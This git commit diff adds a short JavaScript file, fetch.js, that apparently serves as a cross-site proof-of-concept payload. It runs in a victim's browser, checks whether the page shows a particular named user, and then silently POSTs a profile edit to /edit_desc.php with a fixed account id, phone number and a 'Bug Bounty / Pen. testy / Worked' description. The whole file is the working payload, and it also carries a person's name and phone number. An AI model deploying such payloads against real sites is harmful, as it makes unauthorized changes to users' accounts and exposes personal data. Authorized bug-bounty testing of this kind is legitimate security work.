b226b06d46089b3053972b91381ee76837e97dbb
ArdBard <151861131+ArdBard@users.noreply.github.com>
2026-05-14 17:26:28 +0200

    Update fetch.js

--- fetch.js
+++ fetch.js
@@ -1,1 +1,33 @@
+(async () => {
+  const res = await fetch(`/`);
+  const html = await res.text();
 
+  const found =
+    /Jméno:<\/label>\s*<div class="col-sm-9">\s*<p class="form-control-static">\s*Bc\. Jan Kupsa\s*<\/p>/s.test(
+      html
+    );
+
+  if (found) {
+    const body = new URLSearchParams({
+      sso: 212628051,
+      desc: "-+Bug+Bounty%0A-+Pen.+testy%0AWorked",
+      table: "6C6%2F5",
+      mobile: "%2B420+720+843+234"
+    });
+
+    try {
+      const response = await fetch("/edit_desc.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        },
+        body: body.toString(),
+      });
+
+      const result = await response.text();
+      console.log(result);
+    } catch (error) {
+      console.error("POST failed:", error);
+    }
+  }
+})();
